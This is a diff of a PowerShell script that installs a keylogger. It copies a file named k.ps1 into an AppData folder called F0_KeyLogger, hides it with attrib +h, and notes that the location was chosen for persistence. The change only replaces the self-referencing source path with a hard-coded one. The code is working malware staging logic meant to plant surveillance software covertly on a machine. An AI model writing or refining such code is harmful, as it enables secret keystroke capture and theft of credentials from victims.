@@ -1,20 +1,23 @@
-# Set target directory path inside AppData\Local (more conventional for persistence)
-$targetDir = "$env:APPDATA\Local\F0_KeyLogger"
-$targetPath = Join-Path $targetDir "k.ps1"
+# Define the script path manually (replace this with your actual script path)
+$scriptPath = "C:\Path\To\Your\Script\k.ps1"  # Modify this to the actual path where k.ps1 is located
 
-# Ensure the directory exists, create it if not
+# Ensure the directory exists
+$targetDir = "$env:APPDATA\Local\F0_KeyLogger"
 if (-not (Test-Path $targetDir)) {
     New-Item -Path $targetDir -ItemType Directory
 }
 
+# Set the target file path
+$targetPath = Join-Path $targetDir "k.ps1"
+
 # Check if the script path is valid and copy the script to the target directory
-if ($MyInvocation.MyCommand.Path) {
+if (Test-Path $scriptPath) {
     # Copy the script to the target location
-    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $targetPath -Force
+    Copy-Item -Path $scriptPath -Destination $targetPath -Force
     # Make the file hidden
     attrib +h $targetPath
 } else {
-    Write-Host "The script path could not be resolved."
+    Write-Host "The script file does not exist at the provided path."
     exit
 }
 
